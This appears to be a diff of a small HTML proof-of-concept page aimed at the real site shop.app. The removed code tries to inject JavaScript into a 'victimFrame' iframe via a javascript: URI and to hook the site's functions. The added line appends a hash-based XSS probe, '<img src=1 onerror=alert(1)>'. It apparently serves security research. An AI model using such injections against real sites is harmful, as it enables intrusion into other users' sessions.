@@ -6,55 +6,7 @@
 </head>
 <body>
     <h2>Diagnostic Tool</h2>
-    <button onclick="loadAndDiagnose()">Load Shop.App & Start Diagnostics</button>
-    <iframe id="victimFrame"></iframe>
-
-    <script>
-        function loadAndDiagnose() {
-            const frame = document.getElementById('victimFrame');
-            const url = "https://shop.app/";
-
-            frame.src = url;
-            frame.onload = function() {
-                console.log("Iframe finished loading. Now injecting diagnostics via JS URI...");
-                // Inject code by navigating to a javascript: URL
-                // This executes in the context of the iframe
-                const diagnosticCode = `
-                    // Log all hash changes
-                    window.addEventListener('hashchange', function(event) {
-                        console.log('[DIAG] Hashchange event fired!', event.oldURL, ' -> ', event.newURL);
-                    });
-
-                    // Hook the specific Bt() function
-                    if (typeof Bt === 'function') {
-                        console.log('[DIAG] Bt() function is present.');
-                        const originalBt = Bt;
-                        Bt = function(o, u) {
-                            console.log('[DIAG] Bt() was called with input:', o);
-                            const result = originalBt(o, u);
-                            console.log('[DIAG] Bt() returned:', result);
-                            return result;
-                        };
-                    } else {
-                        console.log('[DIAG] Bt() function NOT found on this page.');
-                    }
-
-                    // Hook the leaveBreadcrumb function
-                    if (typeof d !== 'undefined' && d && typeof d.leaveBreadcrumb === 'function') {
-                        console.log('[DIAG] d.leaveBreadcrumb() is present.');
-                        const originalLeave = d.leaveBreadcrumb;
-                        d.leaveBreadcrumb = function() {
-                            console.log('[DIAG] leaveBreadcrumb() called with args:', arguments);
-                            return originalLeave.apply(this, arguments);
-                        };
-                    }
-                    console.log("[DIAG] Diagnostics active.");
-                `;
-                // Encode the code for use in a URI
-                const encodedCode = encodeURIComponent(diagnosticCode);
-                frame.src = 'javascript:(function(){' + encodedCode + '})();';
-            };
-        }
-    </script>
+    <button onclick="loadAndDiagnose()">Load Shop.App & Start Diagnostics</button
+    <iframe id='victimFrame' src="https://shop.app#" onload="this.src+='<img src=1 onerror=alert(1)>'"></iframe>
 </body>
 </html>
